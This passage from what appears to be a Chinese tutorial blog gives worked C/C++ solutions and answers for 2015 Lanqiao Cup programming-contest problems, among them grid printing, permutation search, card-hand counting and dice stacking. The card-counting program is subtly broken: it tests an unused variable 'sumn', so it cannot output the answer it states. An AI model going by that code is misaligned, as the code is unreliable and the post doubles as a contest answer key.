class="keyword">if</span>(x+y==z)</span><br><span class="line">        &#123;</span><br><span class="line">            cout&lt;&lt;x&lt;&lt;endl;</span><br><span class="line">            cout&lt;&lt;y&lt;&lt;endl;</span><br><span class="line">            cout&lt;&lt;z&lt;&lt;endl;</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;三羊献瑞代表的数字为：&quot;</span>&lt;&lt;y&lt;&lt;endl;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//相当于列举高位不为0的所有排列</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>((step==<span class="number">0</span>||step==<span class="number">4</span>)&amp;&amp;i==<span class="number">0</span>)    <span class="comment">//最高位不能为0</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span>(!visited[i])</span><br><span class="line">        &#123;</span><br><span class="line">            visited[i]=<span class="number">1</span>;</span><br><span class="line">            nums[step]=i;</span><br><span class="line">            <span class="built_in">dfs</span>(step+<span class="number">1</span>);</span><br><span class="line">            visited[i]=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="built_in">dfs</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//来源：https://www.cnblogs.com/OctoptusLian/p/8543939.html#_label2</span></span><br></pre></td></tr></table></figure><h1>4.格子中输出</h1><p>StringInGrid函数会在一个指定大小的格子中打印指定的字符串。</p><p>要求字符串在水平、垂直两个方向上都居中。</p><p>如果字符串太长，就截断。</p><p>如果不能恰好居中，可以稍稍偏左或者偏上一点。</p><p>下面的程序实现这个逻辑，请填写划线部分缺少的代码。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">StringInGrid</span><span class="params">(<span class="keyword">int</span> width, <span class="keyword">int</span> height, <span class="keyword">const</span> <span class="keyword">char</span>* s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i,k;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">1000</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(buf, s);</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strlen</span>(s)&gt;width<span class="number">-2</span>) buf[width<span class="number">-2</span>]=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;+&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;width<span class="number">-2</span>;i++) <span class="built_in">printf</span>(<span class="string">&quot;-&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;+\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(k=<span class="number">1</span>; k&lt;(height<span class="number">-1</span>)/<span class="number">2</span>;k++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;|&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;width<span class="number">-2</span>;i++) <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;|\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;|&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%*s%s%*s&quot;</span>,_____________________________________________);  <span class="comment">//填空</span></span><br><span class="line">          </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;|\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(k=(height<span class="number">-1</span>)/<span class="number">2</span>+<span class="number">1</span>; k&lt;height<span class="number">-1</span>; k++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;|&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;width<span class="number">-2</span>;i++) <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;|\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;+&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;width<span class="number">-2</span>;i++) <span class="built_in">printf</span>(<span class="string">&quot;-&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;+\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">StringInGrid</span>(<span class="number">20</span>,<span class="number">6</span>,<span class="string">&quot;abcd1234&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于题目中数据，应该输出：</p><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20210409172118496.png"  alt="在这里插入图片描述"></p><p>思路：这题就是单纯考输出，浏览代码发现没有abcd1234那一行内容，也可以直接先将填空那行注释掉运行下看看缺啥，如图<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20210409172124247.png"  alt="在这里插入图片描述"></p><p>这里隐含知识点就是printf(“%*s”,int,str)的含义</p><p>例如printf(“%*s”,6, “abc”)就是把”abc”放到在域宽为6的空间中右对齐。</p><p>而要填写的那行为&quot;%*s%s%*s&quot;对应着答案输出中的左边的空格，abcd1234和右边的空格</p><p>若要居中，左右的空格为(总宽度-字符串宽度)/2，注意这里总宽度要减去左右两个“|”</p><p>所以答案为(width-2-strlen(s))/2,&quot; “,s,(width-2-strlen(s))/2,” &quot;</p><h1>5.九数组分数</h1><p>1,2,3…9 这九个数字组成一个分数，其值恰好为1/3，如何组法？</p><p>下面的程序实现了该功能，请填写划线部分缺失的代码。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">int</span> x[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = x[<span class="number">0</span>]*<span class="number">1000</span> + x[<span class="number">1</span>]*<span class="number">100</span> + x[<span class="number">2</span>]*<span class="number">10</span> + x[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">int</span> b = x[<span class="number">4</span>]*<span class="number">10000</span> + x[<span class="number">5</span>]*<span class="number">1000</span> + x[<span class="number">6</span>]*<span class="number">100</span> + x[<span class="number">7</span>]*<span class="number">10</span> + x[<span class="number">8</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(a*<span class="number">3</span>==b) <span class="built_in">printf</span>(<span class="string">&quot;%d / %d\n&quot;</span>, a, b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> x[], <span class="keyword">int</span> k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,t;</span><br><span class="line">    <span class="keyword">if</span>(k&gt;=<span class="number">9</span>)&#123;</span><br><span class="line">        <span class="built_in">test</span>(x);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(i=k; i&lt;<span class="number">9</span>; i++)&#123;</span><br><span class="line">        &#123;t=x[k]; x[k]=x[i]; x[i]=t;&#125;</span><br><span class="line">        <span class="built_in">f</span>(x,k+<span class="number">1</span>);</span><br><span class="line">        _____________________________________________ <span class="comment">// 填空处</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x[] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;;</span><br><span class="line">    <span class="built_in">f</span>(x,<span class="number">0</span>);    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>思路：非常经典的dfs，{t=x[k]; x[k]=x[i]; x[i]=t;}进行修改，调用f(x,k+1);后要将修改还原回来即回溯</p><p>而{t=x[k]; x[k]=x[i]; x[i]=t;}实际上就是将x[k]和x[i]互换，所以再次互换即可还原</p><p>答案：t=x[k]; x[k]=x[i]; x[i]=t;</p><h1>6.加法变乘法</h1><p>我们都知道：1+2+3+ … + 49 = 1225现在要求你把其中两个不相邻的加号变成乘号，使得结果为2015</p><p>比如：1+2+3+…+10<em>11+12+…+27</em>28+29+…+49 = 2015就是符合要求的答案。</p><p>请你寻找另外一个可能的答案，并把位置靠前的那个乘号左边的数字提交（对于示例，就是提交10）。</p><p>注意：需要你提交的是一个整数，不要填写任何多余的内容。</p><p>思路：替换其中两个加号，两个for循环遍历乘号位置，替换后用1225减去原来相加的值，再加上替换后相乘的值，如果等于2015便输出</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tihuan</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> res=<span class="number">1225</span>;</span><br><span class="line">    res=res-x-x<span class="number">-1</span>;</span><br><span class="line">    res=res-y-y<span class="number">-1</span>;</span><br><span class="line">    res=res+x*(x+<span class="number">1</span>);</span><br><span class="line">    res=res+y*(y+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">48</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = i+<span class="number">1</span>; j &lt;= <span class="number">48</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(i!=j&amp;&amp;<span class="built_in">abs</span>(i-j)!=<span class="number">1</span>&amp;&amp;<span class="built_in">tihuan</span>(i,j)==<span class="number">2015</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                cout&lt;&lt;i&lt;&lt;endl;</span><br><span class="line">                cout&lt;&lt;j&lt;&lt;endl;</span><br><span class="line">            &#125;           </span><br><span class="line">        &#125;    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>答案：16</p><h1>7.牌型种数</h1><p>小明被劫持到X赌城，被迫与其他3人玩牌。一副扑克牌（去掉大小王牌，共52张），均匀发给4个人，每个人13张。这时，小明脑子里突然冒出一个问题：如果不考虑花色，只考虑点数，也不考虑自己得到的牌的先后顺序，自己手里能拿到的初始牌型组合一共有多少种呢？</p><p>请填写该整数，不要填写任何多余的内容或说明文字。</p><p>思路：52张牌即A、2、3、… 、K，可以看成1、2、3…13每个数字分别有4个</p><p>最直接的用13个for循环每个循环从0到4代表当前卡牌选取卡牌个数，如果和为13，则结果加1</p><p>也可以用dfs替代多重循环</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> res=<span class="number">0</span>,sumn=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> step,<span class="keyword">int</span> sum)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(sumn&gt;<span class="number">13</span>)     <span class="comment">//若当前选取卡牌个数超过13则直接return(dfs剪枝)</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span>(step==<span class="number">13</span>)    <span class="comment">//当遍历到13号卡牌时</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(sumn==<span class="number">13</span>)    <span class="comment">//若总共选了13张</span></span><br><span class="line">            res++;  </span><br><span class="line">        <span class="keyword">return</span>;    <span class="comment">//这个return不能放在if(sumn==13)里，无论sumn等不等于13都要return不然会一直循环下去</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; i++)    <span class="comment">//i代表step卡牌选了i张</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">dfs</span>(step+<span class="number">1</span>,sum+i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">dfs</span>(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    cout&lt;&lt;res&lt;&lt;endl;    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>答案：3598180</p><h1>8.移动距离</h1><p>X星球居民小区的楼房全是一样的，并且按矩阵样式排列。其楼房的编号为1,2,3…当排满一行时，从下一行相邻的楼往反方向排号。比如：当小区排号宽度为6时，开始情形如下：</p><p>1 2 3 4 5 6</p><p>12 11 10 9 8 7</p><p>13 14 15 …</p><p>我们的问题是：已知了两个楼号m和n，需要求出它们之间的最短移动距离（不能斜线方向移动）</p><p>输入为3个整数w m n，空格分开，都在1到10000范围内w为排号宽度，m,n为待计算的楼号。要求输出一个整数，表示m n 两楼间最短移动距离。</p><p>例如：用户输入：6 8 2则，程序应该输出：4</p><p>再例如：用户输入：4 7 20则，程序应该输出：5</p><p>思路：先判断两个数分别所在的行和列，然后用行的差和列的差相加即可</p><p>为计算方便矩阵从0行0列开始，0行0列存放0，所以对m和n减1即可</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> w,m,n;</span><br><span class="line"><span class="keyword">int</span> x1,y1,x2,y2;</span><br><span class="line"><span class="keyword">int</span> j1,j2,res;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cin&gt;&gt;w&gt;&gt;m&gt;&gt;n;</span><br><span class="line">    j1=((m<span class="number">-1</span>)/w)%<span class="number">2</span>;<span class="comment">//m是否在奇数行</span></span><br><span class="line">    j2=((n<span class="number">-1</span>)/w)%<span class="number">2</span>;<span class="comment">//n是否在奇数行</span></span><br><span class="line"></span><br><span class="line">    x1=(m<span class="number">-1</span>)/w;</span><br><span class="line">    y1=(m<span class="number">-1</span>)%w;</span><br><span class="line">    <span class="keyword">if</span>(j1==<span class="number">1</span>)   <span class="comment">//如果在奇数行y要调换位置</span></span><br><span class="line">        y1=w-y1<span class="number">-1</span>;</span><br><span class="line">    </span><br><span class="line">    x2=(n<span class="number">-1</span>)/w;</span><br><span class="line">    y2=(n<span class="number">-1</span>)%w;</span><br><span class="line">    <span class="keyword">if</span>(j2==<span class="number">1</span>)</span><br><span class="line">        y2=w-y2<span class="number">-1</span>;</span><br><span class="line">    </span><br><span class="line">    res=<span class="built_in">abs</span>(x1-x2)+<span class="built_in">abs</span>(y1-y2);</span><br><span class="line">    cout&lt;&lt;res&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>9.垒骰子</h1><p>赌圣atm晚年迷恋上了垒骰子，就是把骰子一个垒在另一个上边，不能歪歪扭扭，要垒成方柱体。经过长期观察，atm 发现了稳定骰子的奥秘：有些数字的面贴着会互相排斥！我们先来规范一下骰子：1 的对面是 4，2 的对面是 5，3 的对面是 6。假设有 m 组互斥现象，每组中的那两个数字的面紧贴在一起，骰子就不能稳定的垒起来。atm想计算一下有多少种不同的可能的垒骰子方式。两种垒骰子方式相同，当且仅当这两种方式中对应高度的骰子的对应数字的朝向都相同。由于方案数可能过多，请输出模 10^9 + 7 的结果。</p><p>不要小看了 atm 的骰子数量哦～</p><p>「输入格式」第一行两个整数 n mn表示骰子数目接下来 m 行，每行两个整数 a b ，表示 a 和 b 数字不能紧贴在一起。</p><p>「输出格式」一行一个数，表示答案模 10^9 + 7 的结果。</p><p>「样例输入」<br>2 1<br>1 2</p><p>「样例输出」544</p><p>「数据范围」对于 30% 的数据：n &lt;= 5对于 60% 的数据：n &lt;= 100对于 100% 的数据：0 &lt; n &lt;= 10^9, m &lt;= 36</p><ul><li>思路一：用记忆化DP列举所有情况，对于每个骰子可以旋转结果乘4，具体解析见代码</li></ul><p>代码来自：<a href="https://www.cnblogs.com/OctoptusLian/p/8543939.html#_label6">2015年第六届蓝桥杯C/C++B组省赛题目解析</a>，根据自己理解加了详细注释</p><blockquote><p>能拿一半多的分，但数据较大时会超时</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 1000000007</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> o[<span class="number">7</span>] = &#123; <span class="number">0</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span> &#125;; <span class="comment">//这样写好处是比如底面是1，那顶面就是o[1]=4</span></span><br><span class="line"><span class="keyword">bool</span> conflict[<span class="number">7</span>][<span class="number">7</span>];</span><br><span class="line"><span class="keyword">int</span> n, m;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> ans = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">200005</span>;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> dp[maxn][<span class="number">7</span>];  <span class="comment">//dp[p][q]表示第p层骰子底面是q的情况种数</span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> step, <span class="keyword">int</span> p)</span>  <span class="comment">//计算第step层骰子底面是p时的情况种数(暂不考虑骰子可以旋转)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (step == n)      <span class="comment">//最顶层底面无论是什么情况都是一种</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (dp[step][p] &gt;= <span class="number">0</span>)   <span class="comment">//若第step层底面是q的情况种数大于等于0说明之前计算过这个数，可以直接返回，不用重复计算</span></span><br><span class="line">        <span class="keyword">return</span> dp[step][p];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> t = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; <span class="number">7</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (conflict[i][o[p]])  <span class="comment">//判断上面那个骰子底面是i时和当前骰子的顶面o[p]冲不冲突</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        t += <span class="built_in">dfs</span>(step + <span class="number">1</span>, i);  <span class="comment">//遍历上面的骰子底面是i的情况种数</span></span><br><span class="line">        t %= N;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[step][p] = t; <span class="comment">//返回第step层底面是p的情况种数，并将结果存到数组中</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(dp, <span class="number">-1</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(dp));</span><br><span class="line">    cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> t1, t2;</span><br><span class="line">        cin &gt;&gt; t1 &gt;&gt; t2;</span><br><span class="line">        conflict[t1][t2] = <span class="number">1</span>;</span><br><span class="line">        conflict[t2][t1] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; <span class="number">7</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ans += <span class="built_in">dfs</span>(<span class="number">1</span>, i);   <span class="comment">//对于第一层骰子，底面分别是1~6时的情况种数相加</span></span><br><span class="line">        ans %= N;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) <span class="comment">//而每个骰子可以旋转4次,所以对于每个骰子ans都要乘4</span></span><br><span class="line">    &#123;</span><br><span class="line">        ans *= <span class="number">4</span>;</span><br><span class="line">        ans %= N;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; ans &lt;&lt; endl;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>思路二：矩阵快速幂</li></ul><p>快速幂基础知识讲解：<a href="https://blog.csdn.net/zss192/article/details/115552759">快速幂</a></p><blockquote><p>注：以下思路和代码来源和思路一相同</p></blockquote><p>和思路一一样，我们只考虑底面的情况，最后乘上4^n即可。</p><p>我们设六阶矩阵An，其中An的第a行第b列表示第一层底面数字为a、第n层数字为b的所有排列的情况</p><p>记六阶矩阵X中，第a行第b列表示相邻两层的是否能成功连接的情况。a和b能连则为1，a和b不能连则为0（注意是相邻两层的底面，不是衔接面，所以要转化，比如题给的1 2要改为1 5）</p><p>根据上述定义，易得递推式：</p><p>An = An-1X，且 A1 = E（六阶单位矩阵）</p><p>可得到An的表达式为An = Xn-1</p><p>那么ans就是矩阵 Xn-1 的36个元素之和</p><p>注意最后侧面的4^n也要二分幂不然会爆炸</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 